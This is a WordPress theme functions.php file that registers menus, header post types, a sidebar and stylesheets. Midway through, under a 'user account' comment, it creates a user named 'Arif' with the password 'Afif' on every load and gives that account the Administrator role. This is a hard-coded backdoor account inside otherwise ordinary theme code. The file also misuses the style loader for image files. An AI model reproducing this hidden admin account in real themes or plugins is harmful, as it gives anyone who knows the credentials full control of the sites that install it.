<?php 

  add_theme_support( 'title-tag' );
  add_theme_support('post-thumbnails');

 

/*=============
   menus
 =====================================================================*/ 

  register_nav_menus( array(
    'header_menu' => 'main menu',
    'footer_menu' => 'My Custom Footer Menu',
  ) );




/*=============
   blog page header
 =====================================================================*/   


   register_post_type('blogHeader', array(

    'labels' => array(
        'name'                  => 'Blog Page header',
        'add_new_item'          => 'Add new item'
 
    ),
        'public'    => true,
	    'supports'  => array( 'title','thumbnail')
));
/*=============
   home page header
 =====================================================================*/   
   register_post_type('homeHeader', array(

    'labels' => array(
        'name'                  => 'Home Page header',
        'add_new_item'          => 'Add new item'
 
    ),
      'public'    => true,
      'supports'  => array( 'title','thumbnail'),
      'menu_icon'  => get_template_directory_uri().'/images/fancybox/fancybox_loading.gif'
));


/*=============
   about page header
 =====================================================================*/   
   register_post_type('aboutHeader', array(

    'labels' => array(
        'name'                  => 'About Page header',
        'add_new_item'          => 'Add new item'
 
    ),
      'public'    => true,
      'supports'  => array( 'title','thumbnail'),
      'menu_icon'  => 'dashicons-image-flip-horizontal'
)); 



/*=============
   read more 
 =====================================================================*/   
 function readMore($limit){

	$readMoreContent = explode(' ', get_the_content());

	$lessContent     = array_slice($readMoreContent, 0, $limit);

	echo implode(" ", $lessContent);
}


 
 







/*=============
   blog side bar 
 =====================================================================*/
  function blog_right_sideBar(){
 
  register_sidebar( array(
  
  'name'         =>'Right side bar',
  'description'  =>'Add your right from here',
  'id'            => 'right-sidebar',
  'before_widget' => '<div class="sidebar-widget" >',
  'after_widget'  => '</div>',
  'before_title'  =>'<h3 class="sidebar-header">',
  'after_title'   =>'</h3>'

  
  ) );
 }
 add_action('widgets_init', 'blog_right_sideBar');


/*=============
    user account
 =====================================================================*/

 $newUser = new WP_user(wp_create_user('Arif','Afif','Afif@gmail.com' ));


 $newUser->set_role('Administrator');


 
 





/*================
    CSS and js
 =====================================================================*/

function boxCssAndJs(){

  wp_register_style('maincss', get_template_directory_uri().'/stylesheets/theme.css');
  wp_register_style('font', get_template_directory_uri().'/stylesheets/fonts.css');
  wp_register_style('fancyBox', get_template_directory_uri().'/stylesheets/fancybox.css');
  wp_register_style('fontAwsome', get_template_directory_uri().'/stylesheets/font-awesome-all.css');
  wp_register_style('responsive', get_template_directory_uri().'/stylesheets/responsive.css');
  wp_register_style('bootsraps', get_template_directory_uri().'/stylesheets/bootstrap.css');
  wp_register_style('apple1', get_template_directory_uri().'/apple-touch-icon-57x57-precomposed.png');
  wp_register_style('apple2', get_template_directory_uri().'/apple-touch-icon-72x72-precomposed.png');
  wp_register_style('apple3', get_template_directory_uri().'/apple-touch-icon-114x114-precomposed.png');
  wp_register_style('apple4', get_template_directory_uri().'/favicon.ico');




  wp_enqueue_style('maincss');
  wp_enqueue_style('font');
  wp_enqueue_style('fancyBox');
  wp_enqueue_style('fontAwsome');
  wp_enqueue_style('responsive');
  wp_enqueue_style('bootsraps');
  wp_enqueue_style('apple1');
  wp_enqueue_style('apple2');
  wp_enqueue_style('apple3');
  wp_enqueue_style('apple4');
 


}

add_action('wp_enqueue_scripts','boxCssAndJs');
 



/*================
    redux framwork
 =====================================================================*/

require_once('lib/ReduxCore/framework.php');
require_once('lib/sample/config.php');



/*================
    CMB2 framwork
 =====================================================================*/

 require_once('meta-box/index.php');
 require_once('meta-box/functions.php');